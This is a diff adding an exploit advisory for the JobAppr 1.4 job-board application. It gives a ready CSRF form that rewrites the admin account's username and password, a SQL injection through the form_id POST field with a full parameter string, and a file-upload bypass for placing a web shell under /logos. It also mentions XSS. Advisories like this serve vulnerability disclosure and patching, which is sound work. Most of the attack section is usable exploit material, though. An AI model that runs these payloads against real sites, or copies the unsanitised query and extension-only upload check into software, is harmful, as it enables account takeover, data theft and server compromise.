@@ -1,0 +1,53 @@
+=======================================
+JobAppr <= 1.4 Multiple Vulnerabilities
+=======================================
+
+Author___: giudinvx
+Email____: <giudinvx[at]gmail[dot]com>
+Date_____: 21/12/2010
+Site_____: http://www.giudinvx.altervista.org/
+--------------------------------------------------------
+Application Info:
+JobAppr is a simple job board software for every category
+Version 1.4http://www.jobappr.com/
+--------------------------------------------------------
+
+[+] CSRF
+<form action="[jobappr_path]/admin/profile.php" method="post" id="account">
+<input type="hidden" value="1" name="role_id">
+<input type="text" value="" name="first_name"><em>First</em><br/>
+<input type="text" value="" name="last_name"><em>Last</em><br/>
+<input type="text" value="" name="email"><em>email</em><br/>
+<input type="text" value="" name="username"><em>username</em><br/>
+<input type="password" value="" name="password"><em>Password</em><br/>
+<input type="password" value="" name="password_confirm"><em>Confirm
+password</em><br/>
+<input type="submit" value="Update Your Profile" name="submit"
+class="submit"></td>
+</form>
+
+[+] Sql Injection
+Vulnerable code: post.php
+91:   mysql_query("UPDATE ". TB_JOBS ."	SET
+logo='".clean($logo_url)."' WHERE form_id='".$_POST['form_id']."'");
+
+For exploit this vulnerability you have need to set up some POST variables.
+title=1&categor=1&location=1&description=1&apply=1&company=1&website=www.localhost.com&email=localhost@www.com&highlight=1&form_id=[Sql_Injection_here]
+
+[+] Arbitrary File Upload
+Vulnerable code: post.php
+48: $ext = strtolower(substr($_FILES["logo"]["name"],
+strrpos($_FILES["logo"]["name"], '.') + 1));
+
+50:   # check to see if it's an image file based on it's extention
+51:   if ($ext != 'jpg' && $ext != 'jpeg' && $ext != 'gif' && $ext != 'png' ) {
+52:   	$errors = true; $err_logo = 'Invalid logo file type (jpg, gif,
+png accepted)<br />';
+
+You can upload a shell with an extension jpg,jpeg,gif or png, and
+after find them in /logos path.
+Also for this exploit this vulnerability have need to set up POST vars above.
+
+[+] XSS
+post.php page have also this vulnerability, you can exploit this with
+above post vars.
